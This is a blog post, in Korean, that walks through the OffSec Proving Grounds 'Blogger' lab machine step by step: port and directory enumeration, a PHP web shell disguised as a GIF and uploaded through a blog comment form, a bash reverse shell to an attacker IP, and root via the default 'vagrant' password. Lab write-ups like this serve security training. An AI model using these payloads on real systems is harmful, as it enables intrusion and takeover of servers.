---
title: "Blogger Writeup"
date: 2025-09-03T00:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab Blogger Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/blogger-writeup/cover.jpg" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---


## Enumeration
### Nmap
command
``` shell
sudo nmap -p- target
```

result
```
Nmap scan report for target (192.168.138.217)
Host is up (0.099s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
165/tcp   filtered xns-courier
3419/tcp  filtered softaudit
4852/tcp  filtered unknown
6717/tcp  filtered unknown
7811/tcp  filtered unknown
13716/tcp filtered netbackup
17741/tcp filtered unknown
26603/tcp filtered unknown
27064/tcp filtered unknown
28007/tcp filtered unknown
31615/tcp filtered unknown
32895/tcp filtered unknown
35304/tcp filtered unknown
37064/tcp filtered unknown
42017/tcp filtered unknown
42225/tcp filtered unknown
44837/tcp filtered unknown
52074/tcp filtered unknown
56306/tcp filtered unknown
59791/tcp filtered unknown
61590/tcp filtered unknown
```

### Gobuster

command
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -z
```

result
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 271]
/.hta                 (Status: 403) [Size: 271]
/.htaccess            (Status: 403) [Size: 271]
/assets               (Status: 301) [Size: 301] [--> http://target/assets/]
/css                  (Status: 301) [Size: 298] [--> http://target/css/]
/images               (Status: 301) [Size: 301] [--> http://target/images/]
/index.html           (Status: 200) [Size: 46199]
/js                   (Status: 301) [Size: 297] [--> http://target/js/]
/server-status        (Status: 403) [Size: 271]
===============================================================
Finished
===============================================================
```
* assets 디렉토리가 공개되어 있습니다.
![alt text](images/blogger/blogger-img1.png)
* blog 경로에서 블로그 페이지로의 접근이 가능했습니다.

``` shell
# /etc/hosts

# Target Boxes
192.168.138.217 blogger.pg
```
* 페이지들에서 절대경로로 위 주소가 지정되어 있기에 편의를 위해 `hosts`파일을 수정합니다.

## Exploitation

* 블로그 내의 댓글 기능에서 파일을 업로드할 수 있습니다.
``` 
GIF89a;
<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>
```
* Burp를 통해 파일을 위 페이로드로 변조하여 업로드합니다.

```
http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/09/a.gif-1756801043.6129.php?cmd={command}
```
* 위 url을 통해서 커맨드를 실행할 수 있습니다.

```shell
nc -nvlp 4444
```
```
http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/09/a.gif-1756801043.6129.php?cmd=bash%20-c%20%27bash%20-i%20>%26%20%2Fdev%2Ftcp%2F192.168.45.214%2F4444%200>%261%27

# url encoded된 명령어의 원본
bash -c 'bash -i >& /dev/tcp/192.168.45.214/4444 0>&1'
```
* netcat을 통해 reverse shell을 얻어냅니다.

```
/usr/bin/script -qc /bin/bash /dev/null
```
* reverse shell을 처음 얻어낸 상태에서는 shell세션이 없기 때문에 위 커맨드를 입력하여 새로운 bash 세션을 얻어냅니다.


## Privilege Escalation
### vagrant default password
- Vagrant는 가상화 소프트웨어(virtual box등)를 조작하기 위한 오픈소스 소프트웨어로 가상환경 내에서 유저를 가집니다.
- Vagrant의 default password는 `vagrant`입니다. 해당 유저로 로그인한 후 root권한을 얻어낼 수 있습니다.

``` shell
su vagrant
Password: vagrant

```
```shell
sudo su
```


### etc
linpeas
```
https://raw.githubusercontent.com/BRU1S3R/linpeas.sh/refs/heads/main/linpeas.sh
```
